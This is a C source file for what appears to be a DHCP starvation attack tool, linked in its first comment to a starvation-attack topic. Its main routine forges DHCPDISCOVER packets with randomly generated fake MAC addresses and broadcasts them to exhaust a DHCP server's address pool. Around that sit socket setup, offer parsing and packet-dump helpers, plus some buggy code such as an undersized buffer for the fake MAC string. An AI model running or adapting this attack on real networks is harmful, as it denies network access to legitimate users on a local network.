//some hints in : https://github.com/topics/dhcp-starvation-attack
#include "header.h"

unsigned char client_hardware_address[MAX_DHCP_CHADDR_LENGTH] = "";
unsigned int my_client_mac[MAX_DHCP_CHADDR_LENGTH];
int mymac = 0;

u_int32_t packet_xid = 0;

u_int32_t dhcp_lease_time = 0;
u_int32_t dhcp_renewal_time = 0;
u_int32_t dhcp_rebinding_time = 0;

int dhcpoffer_timeout = 2;

dhcp_offer *dhcp_offer_list = NULL;
requested_server *requested_server_list = NULL;

int valid_responses = 0; /* number of valid DHCPOFFERs we received */
int requested_servers = 0;
int requested_responses = 0;

int request_specific_address = FALSE;
int received_requested_address = FALSE;
int verbose = 0;
struct in_addr requested_address;

int set_up_first_connection()
{
	int dhcp_socket;

	/* create socket for DHCP communications */
	dhcp_socket = create_dhcp_socket();

	/* get hardware address of client machine */
	get_hardware_address(dhcp_socket, network_interface_name);

	/* send DHCPDISCOVER packet */
	send_dhcp_discover(dhcp_socket);

	/* wait for a DHCPOFFER packet */
	get_dhcp_offer(dhcp_socket);

	return dhcp_socket;
}

int set_up_connection(int dhcp_socket)
{

	printf("sending offer\n");

	send_dhcp_discover(dhcp_socket);

	get_dhcp_offer(dhcp_socket);

	return 0;
}

int get_hardware_address(int sock, char *interface_name)
{

	int i;

	struct ifreq ifr;

	/* try and grab hardware address of requested interface */
	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
	{
		printf("Error: Could not get hardware address of interface '%s'\n", interface_name);
		exit(STATE_UNKNOWN);
	}
	memcpy(&client_hardware_address[0], &ifr.ifr_hwaddr.sa_data, 6);

	if (verbose)
	{
		printf("Hardware address: ");
		for (i = 0; i < 6; ++i)
			printf("%2.2x", client_hardware_address[i]);
		printf("\n");
	}

	return OK;
}

int send_dhcp_discover(int sock)
{
	dhcp_packet discover_packet;
	struct sockaddr_in sockaddr_broadcast;

	verbose = 1;
	/* clear the packet data structure */
	bzero(&discover_packet, sizeof(discover_packet));

	/* boot request flag (backward compatible with BOOTP servers) */
	discover_packet.op = BOOTREQUEST;

	/* hardware address type */
	discover_packet.htype = ETHERNET_HARDWARE_ADDRESS;

	/* length of our hardware address */
	discover_packet.hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;

	discover_packet.hops = 0;

	/* transaction id is supposed to be random */
	//srand(time(NULL));
	packet_xid = random();
	discover_packet.xid = htonl(packet_xid);

	/**** WHAT THE HECK IS UP WITH THIS?!?  IF I DON'T MAKE THIS CALL, ONLY ONE SERVER RESPONSE IS PROCESSED!!!! ****/
	/* downright bizzarre... */
	ntohl(discover_packet.xid);

	/*discover_packet.secs=htons(65535);*/
	discover_packet.secs = 0xFF;

	/* tell server it should broadcast its response */
	discover_packet.flags = htons(DHCP_BROADCAST_FLAG);

	/* Set random hardware address */
	char *fake = malloc(sizeof(char) * 10);
	sprintf(fake, "%d:%d:%d:%d:%d:%d", 4, rand() % 9, rand() % 9, rand() % 9, rand() % 9, rand() % 9);
	printf("\n Fake MAC adress : %s\n", fake);

	sscanf(fake, "%x:%x:%x:%x:%x:%x",
		   my_client_mac + 0,
		   my_client_mac + 1,
		   my_client_mac + 2,
		   my_client_mac + 3,
		   my_client_mac + 4,
		   my_client_mac + 5);
	for (int i = 0; i < 6; ++i)
		client_hardware_address[i] = my_client_mac[i];

	memcpy(discover_packet.chaddr, client_hardware_address, ETHERNET_HARDWARE_ADDRESS_LENGTH);

	/* first four bytes of options field is magic cookie (as per RFC 2132) */
	discover_packet.options[0] = '\x63';
	discover_packet.options[1] = '\x82';
	discover_packet.options[2] = '\x53';
	discover_packet.options[3] = '\x63';

	/* DHCP message type is embedded in options field */
	discover_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE; /* DHCP message type option identifier */
	discover_packet.options[5] = '\x01';				   /* DHCP message option length in bytes */
	discover_packet.options[6] = DHCPDISCOVER;
	discover_packet.options[10] = '\xff';

	/* the IP address we're requesting */
	if (request_specific_address == TRUE)
	{
		discover_packet.options[7] = DHCP_OPTION_REQUESTED_ADDRESS;
		discover_packet.options[8] = '\x04';
		memcpy(&discover_packet.options[9], &requested_address, sizeof(requested_address));
	}

	/* send the DHCPDISCOVER packet to broadcast address */
	sockaddr_broadcast.sin_family = AF_INET;
	sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
	sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
	bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

	if (verbose)
	{
		printf("DHCPDISCOVER to %s port %d\n", inet_ntoa(sockaddr_broadcast.sin_addr), ntohs(sockaddr_broadcast.sin_port));
		printf("DHCPDISCOVER XID: %lu (0x%X)\n", (unsigned long)ntohl(discover_packet.xid), ntohl(discover_packet.xid));
		printf("DHCDISCOVER ciaddr:  %s\n", inet_ntoa(discover_packet.ciaddr));
		printf("DHCDISCOVER yiaddr:  %s\n", inet_ntoa(discover_packet.yiaddr));
		printf("DHCDISCOVER siaddr:  %s\n", inet_ntoa(discover_packet.siaddr));
		printf("DHCDISCOVER giaddr:  %s\n", inet_ntoa(discover_packet.giaddr));
	}

	/* send the DHCPDISCOVER packet out */
	send_dhcp_packet(&discover_packet, sizeof(discover_packet), sock, &sockaddr_broadcast);

	if (verbose)
		printf("\n\n");

	return OK;
}

int get_dhcp_discover(int sock)
{
	dhcp_packet discover_packet;
	struct sockaddr_in source;
	int result = OK;
	int timeout = 1;
	int responses = 0;
	int x;
	time_t start_time;
	time_t current_time;

	time(&start_time);

	/* receive as many responses as we can */
	for (responses = 0, valid_responses = 0;;)
	{

		time(&current_time);
		if ((current_time - start_time) >= dhcpoffer_timeout)
			break;

		if (verbose)
			printf("\n\n");

		bzero(&source, sizeof(source));
		bzero(&discover_packet, sizeof(discover_packet));

		result = OK;
		result = receive_dhcp_packet(&discover_packet, sizeof(discover_packet), sock, dhcpoffer_timeout, &source);

		if (result != OK)
		{
			if (verbose)
				printf("Result=ERROR\n");

			continue;
		}
		else
		{
			if (verbose)
				printf("Result=OK\n");

			responses++;
		}

		if (verbose)
		{
			printf("DHCPdiscover from IP address %s\n", inet_ntoa(source.sin_addr));
			printf("DHCPdiscover XID: %lu (0x%X)\n", (unsigned long)ntohl(discover_packet.xid), ntohl(discover_packet.xid));
		}

		/* check packet xid to see if its the same as the one we used in the discover packet */
		// if(ntohl(discover_packet.xid)!=packet_xid){
		// 	if (verbose)
		// 		printf("DHCPOFFER XID (%lu) did not match DHCPDISCOVER XID (%lu) - ignoring packet\n",(unsigned long) ntohl(offer_packet.xid),(unsigned long) packet_xid);

		// 	continue;
		//         }

		/* check hardware address */
		result = OK;
		if (verbose)
			printf("DHCPOFFER chaddr: ");

		for (x = 0; x < ETHERNET_HARDWARE_ADDRESS_LENGTH; x++)
		{
			if (verbose)
				printf("%02X", (unsigned char)discover_packet.chaddr[x]);

			// if(offer_packet.chaddr[x]!=client_hardware_address[x])
			// 	result=ERROR;
		}
		if (verbose)
			printf("\n");

		if (result == ERROR)
		{
			if (verbose)
				printf("DHCPOFFER hardware address did not match our own\n");

			//continue;
		}

		if (verbose)
		{
			printf("DHCPDiscover ciaddr: %s\n", inet_ntoa(discover_packet.ciaddr));
			printf("DHCPdiscover yiaddr: %s\n", inet_ntoa(discover_packet.yiaddr));
			printf("DHCPdiscover siaddr: %s\n", inet_ntoa(discover_packet.siaddr));
			printf("DHCPdiscover giaddr: %s\n", inet_ntoa(discover_packet.giaddr));
		}

		valid_responses++;
	}

	if (verbose)
	{
		printf("Total responses seen on the wire: %d\n", responses);
		printf("Valid responses for this machine: %d\n", valid_responses);
	}

	return OK;
}
int get_dhcp_offer(int sock)
{
	dhcp_packet offer_packet;
	struct sockaddr_in source;
	int result = OK;
	int timeout = 1;
	int responses = 0;
	int x;
	time_t start_time;
	time_t current_time;

	time(&start_time);

	/* receive as many responses as we can */
	for (responses = 0, valid_responses = 0;;)
	{

		time(&current_time);
		if ((current_time - start_time) >= dhcpoffer_timeout)
			break;

		if (verbose)
			printf("\n\n");

		bzero(&source, sizeof(source));
		bzero(&offer_packet, sizeof(offer_packet));

		result = OK;
		result = receive_dhcp_packet(&offer_packet, sizeof(offer_packet), sock, dhcpoffer_timeout, &source);

		if (result != OK)
		{
			if (verbose)
				printf("Result=ERROR\n");

			continue;
		}
		else
		{
			if (verbose)
				printf("Result=OK\n");

			responses++;
		}

		if (verbose)
		{
			printf("DHCPOFFER from IP address %s\n", inet_ntoa(source.sin_addr));
			printf("DHCPOFFER XID: %lu (0x%X)\n", (unsigned long)ntohl(offer_packet.xid), ntohl(offer_packet.xid));
		}

		/* check packet xid to see if its the same as the one we used in the discover packet */
		if (ntohl(offer_packet.xid) != packet_xid)
		{
			if (verbose)
				printf("DHCPOFFER XID (%lu) did not match DHCPDISCOVER XID (%lu) - ignoring packet\n", (unsigned long)ntohl(offer_packet.xid), (unsigned long)packet_xid);

			continue;
		}

		/* check hardware address */
		result = OK;
		if (verbose)
			printf("DHCPOFFER chaddr: ");

		for (x = 0; x < ETHERNET_HARDWARE_ADDRESS_LENGTH; x++)
		{
			if (verbose)
				printf("%02X", (unsigned char)offer_packet.chaddr[x]);

			if (offer_packet.chaddr[x] != client_hardware_address[x])
				result = ERROR;
		}
		if (verbose)
			printf("\n");

		if (result == ERROR)
		{
			if (verbose)
				printf("DHCPOFFER hardware address did not match our own\n");

			//continue;
		}

		if (verbose)
		{
			printf("DHCPOFFER ciaddr: %s\n", inet_ntoa(offer_packet.ciaddr));
			printf("DHCPOFFER yiaddr: %s\n", inet_ntoa(offer_packet.yiaddr));
			printf("DHCPOFFER siaddr: %s\n", inet_ntoa(offer_packet.siaddr));
			printf("DHCPOFFER giaddr: %s\n", inet_ntoa(offer_packet.giaddr));
		}

		valid_responses++;
	}

	if (verbose)
	{
		printf("Total responses seen on the wire: %d\n", responses);
		printf("Valid responses for this machine: %d\n", valid_responses);
	}

	return OK;
}

/* sends a DHCP packet */
int send_dhcp_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest)
{
	struct sockaddr_in myname;
	int result;

	result = sendto(sock, (char *)buffer, buffer_size, 0, (struct sockaddr *)dest, sizeof(*dest));

	if (verbose)
		printf("send_dhcp_packet result: %d\n", result);

	if (result < 0)
		return ERROR;

	return OK;
}

/* receives a DHCP packet */
int receive_dhcp_packet(void *buffer, int buffer_size, int sock, int timeout, struct sockaddr_in *address)
{
	struct timeval tv;
	fd_set readfds;
	int recv_result;
	socklen_t address_size;
	struct sockaddr_in source_address;

	/* wait for data to arrive (up time timeout) */
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	FD_ZERO(&readfds);
	FD_SET(sock, &readfds);
	select(sock + 1, &readfds, NULL, NULL, &tv);

	/* make sure some data has arrived */
	if (!FD_ISSET(sock, &readfds))
	{
		if (verbose)
			printf("No (more) data received\n");
		return ERROR;
	}

	else
	{

		/* why do we need to peek first?  i don't know, its a hack.  without it, the source address of the first packet received was
		   not being interpreted correctly.  sigh... */
		bzero(&source_address, sizeof(source_address));
		address_size = sizeof(source_address);
		recv_result = recvfrom(sock, (char *)buffer, buffer_size, MSG_PEEK, (struct sockaddr *)&source_address, &address_size);
		if (verbose)
			printf("recv_result_1: %d\n", recv_result);
		recv_result = recvfrom(sock, (char *)buffer, buffer_size, 0, (struct sockaddr *)&source_address, &address_size);
		if (verbose)
			printf("recv_result_2: %d\n", recv_result);

		if (recv_result == -1)
		{
			if (verbose)
			{
				printf("recvfrom() failed, ");
				printf("errno: (%d) -> %s\n", errno, strerror(errno));
			}
			return ERROR;
		}
		else
		{
			if (verbose)
			{
				printf("receive_dhcp_packet() result: %d\n", recv_result);
				printf("receive_dhcp_packet() source: %s\n", inet_ntoa(source_address.sin_addr));
			}

			memcpy(address, &source_address, sizeof(source_address));
			return OK;
		}
	}

	return OK;
}

/* creates a socket for DHCP communication */
int create_dhcp_socket(void)
{
	struct sockaddr_in myname;
	struct ifreq interface;
	int sock;
	int flag = 1;

	/* Set up the address we're going to bind to. */
	bzero(&myname, sizeof(myname));
	myname.sin_family = AF_INET;
	myname.sin_port = htons(DHCP_CLIENT_PORT);
	myname.sin_addr.s_addr = INADDR_ANY; /* listen on any address */
	bzero(&myname.sin_zero, sizeof(myname.sin_zero));

	/* create a socket for DHCP communications */
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock < 0)
	{
		printf("Error: Could not create socket!\n");
		exit(STATE_UNKNOWN);
	}

	if (verbose)
		printf("DHCP socket: %d\n", sock);

	/* set the reuse address flag so we don't get errors when restarting */
	flag = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&flag, sizeof(flag)) < 0)
	{
		printf("Error: Could not set reuse address option on DHCP socket!\n");
		exit(STATE_UNKNOWN);
	}

	/* set the broadcast option - we need this to listen to DHCP broadcast messages */
	if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&flag, sizeof flag) < 0)
	{
		printf("Error: Could not set broadcast option on DHCP socket!\n");
		exit(STATE_UNKNOWN);
	}

	/* bind socket to interface */
	strncpy(interface.ifr_ifrn.ifrn_name, network_interface_name, IFNAMSIZ);
	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *)&interface, sizeof(interface)) < 0)
	{
		printf("Error: Could not bind socket to interface %s.  Check your privileges...\n", network_interface_name);
		exit(STATE_UNKNOWN);
	}

	/* bind the socket */
	if (bind(sock, (struct sockaddr *)&myname, sizeof(myname)) < 0)
	{
		printf("Error: Could not bind to DHCP socket (port %d)!  Check your privileges...\n", DHCP_CLIENT_PORT);
		exit(STATE_UNKNOWN);
	}

	return sock;
}

/* closes DHCP socket */
int close_dhcp_socket(int sock)
{

	close(sock);

	return OK;
}

void PrintData(const u_char *data, int Size)
{
	int i, j;
	for (i = 0; i < Size; i++)
	{
		if (i != 0 && i % 16 == 0) //if one line of hex printing is complete...
		{
			fprintf(logfile, "         ");
			for (j = i - 16; j < i; j++)
			{
				if (data[j] >= 32 && data[j] <= 128)
					fprintf(logfile, "%c", (unsigned char)data[j]); //if its a number or alphabet

				else
					fprintf(logfile, "."); //otherwise print a dot
			}
			fprintf(logfile, "\n");
		}

		if (i % 16 == 0)
			fprintf(logfile, "   ");
		fprintf(logfile, " %02X", (unsigned int)data[i]);

		if (i == Size - 1) //print the last spaces
		{
			for (j = 0; j < 15 - i % 16; j++)
			{
				fprintf(logfile, "   "); //extra spaces
			}

			fprintf(logfile, "         ");

			for (j = i - i % 16; j <= i; j++)
			{
				if (data[j] >= 32 && data[j] <= 128)
				{
					fprintf(logfile, "%c", (unsigned char)data[j]);
				}
				else
				{
					fprintf(logfile, ".");
				}
			}

			fprintf(logfile, "\n");
		}
	}
}
void print_ip_header(const u_char *Buffer, int Size)
{
	//    print_ethernet_header(Buffer , Size);

	unsigned short iphdrlen;

	//    struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
	struct iphdr *iph = (struct iphdr *)(Buffer);
	iphdrlen = iph->ihl * 4;

	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;

	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;

	fprintf(logfile, "\n");
	fprintf(logfile, "IP Header\n");
	fprintf(logfile, "   |-IP Version        : %d\n", (unsigned int)iph->version);
	fprintf(logfile, "   |-IP Header Length  : %d DWORDS or %d Bytes\n", (unsigned int)iph->ihl, ((unsigned int)(iph->ihl)) * 4);
	fprintf(logfile, "   |-Type Of Service   : %d\n", (unsigned int)iph->tos);
	fprintf(logfile, "   |-IP Total Length   : %d  Bytes(Size of Packet)\n", ntohs(iph->tot_len));
	fprintf(logfile, "   |-Identification    : %d\n", ntohs(iph->id));
	//fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
	//fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
	//fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
	fprintf(logfile, "   |-TTL      : %d\n", (unsigned int)iph->ttl);
	fprintf(logfile, "   |-Protocol : %d\n", (unsigned int)iph->protocol);
	fprintf(logfile, "   |-Checksum : %d\n", ntohs(iph->check));
	fprintf(logfile, "   |-Source IP        : %s\n", inet_ntoa(source.sin_addr));
	fprintf(logfile, "   |-Destination IP   : %s\n", inet_ntoa(dest.sin_addr));
}

void print_udp_packet(const u_char *Buffer, int Size)
{

	unsigned short iphdrlen;

	//    struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
	struct iphdr *iph = (struct iphdr *)Buffer;
	iphdrlen = iph->ihl * 4;

	//    struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	struct udphdr *udph = (struct udphdr *)(Buffer + iphdrlen);

	//    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
	int header_size = iphdrlen + sizeof udph;

	fprintf(logfile, "\n\n***********************UDP Packet*************************\n");

	print_ip_header(Buffer, Size);

	fprintf(logfile, "\nUDP Header\n");
	fprintf(logfile, "   |-Source Port      : %d\n", ntohs(udph->source));
	fprintf(logfile, "   |-Destination Port : %d\n", ntohs(udph->dest));
	fprintf(logfile, "   |-UDP Length       : %d\n", ntohs(udph->len));
	fprintf(logfile, "   |-UDP Checksum     : %d\n", ntohs(udph->check));

	fprintf(logfile, "\n");
	fprintf(logfile, "IP Header\n");
	PrintData(Buffer, iphdrlen);

	fprintf(logfile, "UDP Header\n");
	PrintData(Buffer + iphdrlen, sizeof udph);

	fprintf(logfile, "Data Payload\n");

	//Move the pointer ahead and reduce the size of string
	PrintData(Buffer + header_size, Size - header_size);

	fprintf(logfile, "\n###########################################################");
}
unsigned short checksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char *)&oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return (answer);
}